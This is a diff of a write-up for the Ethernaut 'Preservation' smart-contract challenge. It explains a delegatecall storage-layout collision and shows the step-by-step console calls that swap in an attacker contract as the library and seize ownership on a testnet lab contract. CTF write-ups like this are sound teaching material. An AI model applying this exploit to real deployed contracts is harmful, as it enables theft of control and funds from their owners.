@@ -231,13 +231,9 @@ From the above code, we can see that it updates the owner state variable. But in
 
 
 
-
-
-
-
 # Subverting
 
-
+In this challenge, we can easily figure out the storage layout vulnerability between Preservation and LibraryContract. That's why, we must mimic the Preservation contract layout structure in the attack contract. In the final step, add a `setTime(uint)` function that manipulates the target contract and sets the owner's value as our wallet address. After necessities, our attack contract looks like this: 
 
 ```solidity
 pragma solidity ^0.8.20;
@@ -255,3 +251,51 @@ contract Attack{
 
 }
 ```
+
+Let's hack the challenge!
+
+
+Firstly, check the owner of the contract and timeZone1Library's address.
+
+```solidity
+await contract.owner()
+'0x7ae0655F0Ee1e7752D7C62493CEa1E69A810e2ed'
+```
+
+```solidity
+await contract.timeZone1Library()
+'0xf88ed7D1Dfcd1Bb89a975662fd7cB536058F3a30'
+```
+
+After then, call the **setFirstTime()** function with our attack contract's address. See the transaction in [etherscan.](https://sepolia.etherscan.io/tx/0xf9ebb1c25c237abaeec0ec801fd95a9d2ac3bd1c9a3d310eb2d14b64f916780d)
+
+```solidity
+await contract.setFirstTime("0xA970e836256FAa388Af589852039De9Dc8Ad6Fac")
+```
+
+It has updated the timeZone1Library's address as attacker contract's address.
+
+```solidity
+await contract.timeZone1Library()
+'0xA970e836256FAa388Af589852039De9Dc8Ad6Fac'
+```
+
+Again, call the setFirstTime() function and get the ownership of the contract. See the transaction in [etherscan.](https://sepolia.etherscan.io/tx/0xf399fafa9a83df0eb3670ad960635a28c95df0c95f49d21425578bf7ac2a8a43)
+
+```solidity
+await contract.setFirstTime("0xA970e836256FAa388Af589852039De9Dc8Ad6Fac")
+```
+
+```solidity
+await contract.owner()
+'0x9C84d84b46971Faf8B480aB116b7f5391D630fA1'
+player
+'0x9C84d84b46971Faf8B480aB116b7f5391D630fA1'
+```
+
+
+Ethernaut's message: 
+
+> As the previous level, delegate mentions, the use of delegatecall to call libraries can be risky. This is particularly true for contract libraries that have their own state. This example demonstrates why the library keyword should be used for building libraries, as it prevents the libraries from storing and accessing state variables.
+
+**_by wasny0ps_**
